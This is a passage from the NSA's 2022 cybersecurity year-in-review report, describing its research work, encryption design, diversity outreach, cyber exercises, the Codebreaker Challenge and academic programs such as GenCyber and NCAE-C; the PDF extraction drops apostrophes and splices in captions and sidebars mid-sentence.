NSA also provides additional assurance of
fielded solutions. For example, the CSfC
program conducted an on-site assessment
of a customer
s CSfC registration, which
compares the registered solution with what
was actually fielded by the implementing
organization. NSA ensured that configurations,
monitoring, and administration were in line
with CSfC Capability Package requirements.
This provides an opportunity for mutual
technology enrichment and sharing, while
capturing opportunities to improve the
security and clarity of the requirements. NSA
plans to do more of these assessments in 2023.
RESEARCHING CYBERSECURITY SOLUTIONS
RESEARCHING
CYBERSECURITY SOLUTIONS
As the U.S. Government
s premier
cybersecurity research and development
center, NSA
s Laboratory for Advanced
Cybersecurity Research delivers tools and
technology advancements that protect and
secure the nation
s cyber ecosystem, from
National Security Systems to everyday devices.
For example, NSA researchers developed
Security-Enhanced Linux (SELinux), which
became the foundation for the SecurityEnhanced Android operating system used
by billions of smartphones worldwide.
NSA researchers achieve these outcomes
by staying at the forefront of emerging
SECURING AMERICA
INFORMATION SYSTEMS
OF TOMORROW
To stay one step ahead of our
adversaries, we must continue to
learn about emerging technologies
and deliver findings and new tools
that protect our sensitive data and
give our nation an advantage.
Gilbert Herrera, NSA Research Director
NSA Research was behind Security-Enhanced Android,
which is now used in billions of smartphones.
PHOTO COURTESY OF GETTY IMAGES
Find us on social media: @NSACyber
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
industry to address top cybersecurity
mission challenges, such as the 2022
International Conference on Machine
Learning (ICML).
NSA researchers are exploring ways to incorporate tapered glass optical fibers into new
technologies to maintain effectiveness at extreme temperatures. This scalable solution
allows compatibility in retrieving data from superconducting computers.
technologies 
 such as artificial intelligence
and machine learning 
 and adapting principles to the cybersecurity domain through
partnerships with universities, federally
funded research labs, and the private sector.
These collaborations are revolutionizing
s collective ability to triage voluminous
amounts of data into actionable and priority
events of concern.
Other recent cybersecurity research
advances include:
Enhanced security of next-generation
technologies poised to transform our
warfighting capabilities, such as 5G,
through the adoption of standards and
industry best practices.
Advanced software-analysis tools and
guidance to ensure the cybersecurity
community can defend software
and hardware development from
sophisticated cyberattacks.
Hosted premier forums bringing
together the best in government and
www.NSA.gov/cybersecurity
Sponsored NSA
s Science of Security
(SoS) Program to encourage foundational cybersecurity research at
academic institutions, promote rigorous
research competitions, and inspire
students to seek out careers supporting
the nation
s cybersecurity workforce.
NSA served as a Special Award Sponsor
at the 2022 Regeneron International
Science and Engineering Fair (ISEF) in
Atlanta, reviewing over 1,800 project
submissions for awards in the categories
of Cybersecurity, Principles of Security
and Privacy, Mathematics, and Material
Science.
USING MATH TO FIND THE
ANSWERS
NSA performs mathematics research,
analysis, and design of cryptographic
algorithms that underpin the cybersecurity
of high-assurance cryptographic solutions
that protect nuclear command and control
systems, space and weapons systems, U.S.
Intelligence Community (IC) networks,
Department of Defense networks, and NSA
Key Management Infrastructure.
In 2022, NSA
s math researchers designed
a new authenticated encryption algorithm
for use in NSA
s forthcoming high-speed
encryption products. The team
s solution
is simple enough to run at incredibly high
speeds without causing the encryptors
to overheat, while simultaneously limiting
their use of power. In addition, it provides
protection against attacks that could result
from the high volume of encrypted data.
Logic components for more energy-efficient operations in high-performance computing.
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
DEVELOPING THE CURRENT AND
NEXT GENERATION OF CYBER EXPERTS
SPOTLIGHTING AND RECRUITING
WOMEN IN CYBERSECURITY
Women comprise about 25 percent of the
global cybersecurity workforce, according
to a 2022 study by Cybersecurity Ventures.
NSA is working with academic, industry, and
government partners to encourage more
women to pursue careers in cybersecurity.
s Cybersecurity Collaboration Center
(CCC) 
 where the workforce is more than 50
percent women 
 is leading the charge. For
the past two years, the CCC has sponsored and
participated in the Women in Cybersecurity
(WiCyS) Conference. Participants have
showcased NSA
s cybersecurity mission
and how diversity has helped NSA solve
difficult problems.
The CCC also is helping to recruit the next
generation of cyber experts. In August,
By prioritizing diversity and investing
in cybersecurity education from
kindergarten through college, we
are fostering the talent we need
to tackle the difficult challenges
of today and tomorrow.
Dave Luber, NSA Cybersecurity Deputy Director
www.NSA.gov/cybersecurity
General Paul M. Nakasone, Commander, U.S.
Cyber Command, Director, NSA/Chief, CSS,
partnered with the CCC to host a weeklong session for a group of female college
students interested in STEM careers. As part
Women Immersed In NSA Cybersecurity,
or WIN-Cyber, the students learned about
s different cybersecurity focuses and had
the opportunity to see themselves at NSA.
Since March, the CCC has publicly released
nine 
Look Around: Women in Cybersecurity
videos that highlight women excelling in
cybersecurity careers across the Intelligence
Community. This not only highlights those
already in the field, but encourages more
women to join. NSA remains committed to
ensuring all people see themselves in cyber
LOOK AROUND
Visit NSA
s YouTube channel to watch
the series 
Look Around: Women in
Cybersecurity.
 Hosted by CCC Chief
Morgan Adamski, the short videos
profile female cybersecurity leaders
across the Intelligence Community.
Morgan Adamski, Cybersecurity Collaboration Center
Chief, speaks to students at the 
Women Immersed in NSA
Cybersecurity
 event.
NSA remains committed to ensuring all people
see themselves in cyber and to fostering a diverse
workforce that is reflective of the global community.
NSA CYBERSECURITY | 2022 YEAR IN REVIEW
and to fostering a diverse workforce that is
reflective of the global community.
PROMOTING DIVERSITY
NSA Cybersecurity Director Rob Joyce is
a strong proponent for increasing diversity
in the cybersecurity field. In February, he
participated in a roundtable discussion
with members of the #ShareTheMicInCyber
movement, which aims to address issues
stemming from systemic racism in
cybersecurity. They discussed diversity and
inclusion at NSA and some of the biggest
cybersecurity challenges his teams face each
day. He also sponsored and participated in a
visit with members of Black Girls in Cyber nonprofit, who discussed their careers and their
efforts to promote diversity in cybersecurity.
EQUIPPING OUR SERVICE MEMBERS
Over 260 cadets and midshipmen from the
U.S. service academies and the U.S. senior
military colleges participated in the 2022
virtual NSA Cyber Exercise (NCX). The threeday event advances cybersecurity skills by
developing and testing the talent, teamwork,
planning, communication, and decisionmaking skills of future military leaders and
cybersecurity professionals. Throughout the
final cyber combat exercise, teams solved
tasks and challenges while simultaneously
offensively attacking and defending against
NSA and Georgia Tech leadership pose with the winners of the 2021 Codebreaker
Challenge during a ceremony in Atlanta.
THE NSA CODEBREAKER
CHALLENGE
Each year, students attending U.S.-based
academic institutions are given the chance to sharpen their skills and gain experience
in mission-centric scenarios similar to what the NSA workforce faces daily.
Through December 31, students are taking on a ransomware attack challenge that
gradually increases in complexity and tests their investigative skills. They must
discover the tools and techniques used in the attack, unravel and expose a
ransomware-as-a-service ring, and recover the critical files to save the day.
Initially launched in 2013 with just five participating schools, more than 5,400 students
from 631 schools participated in the 2021 challenge. Colleges and universities have even
incorporated the challenge into their curriculum, promoting intercampus engagement
and strengthening U.S. cybersecurity education nationwide.
www.NSA.gov/cybersecurity
DEVELOPING THE CURRENT AND NEXT GENERATION OF CYBER EXPERTS
GENCYBER
NSA and the National Science Foundation fund camps and programs
for students and teachers that increase awareness of K-12 educational
cybersecurity content and cybersecurity postsecondary and career
opportunities. In 2022, 74 schools across 37 states and the
District of Columbia hosted student, teacher, and combination
programs, as well as outreach/capacity building activities. To account
for COVID-19, GenCyber provided hybrid (virtual and in-person) options.
other teams. The U.S. Air Force was awarded
the 2022 NCX trophy.
Along with hosting the annual exercise, NSA
also invites our nation
s future military leaders
for a hands-on tour at NSA. Nearly 150 cadets,
midshipmen and students from across the U.S.
service academies, Army Reserve Officers
Training Corps (ROTC), and senior military
colleges participated in the NSA Experiential
Tour (NET). The offering educates service
members about NSA
s signals intelligence
and cybersecurity missions so that they can
apply this knowledge as they assume future
military leadership roles in the extended
cryptologic enterprise.
In 2022, the NET assigned ROTC cadets to
the Johns Hopkins University Applied Physics
s CIRCUIT program where they piloted
an unclassified critical thinking approach
to address unique intelligence problems
throughout the Intelligence Community.
EMPOWERING STUDENTS AND
TEACHERS
NSA plays an important part in promoting
cybersecurity careers and in developing
professionals fit to take on an increasingly
challenging cyber landscape. NSA
National Cryptologic University runs the
National Centers of Academic Excellence
in Cybersecurity (NCAE-C) program, which
works with community colleges, colleges, and
universities interested in advancing the study
of cybersecurity. The program:
Establishes standards for cybersecurity
curriculum and academic excellence
Develops competency among students
and faculty
Values community outreach and
leadership in professional development
Integrates cybersecurity practice
within the institution across academic
disciplines
Pursues solutions to cybersecurity
education challenges
Nearly 400 schools have received the
coveted NCAE-C designation in the areas
of cyber defense, research, and operations.
NSA has also validated nearly 500 programs
of study. The Candidates Program boosted
designations in 2022 by hosting workshops,
seminars, and mentoring sessions with
academic officials pursuing the NCAE-C
designation for their schools. Application
acceptance rates have risen 50 percent as a
result of the program.
Find us on social media: @NSACyber
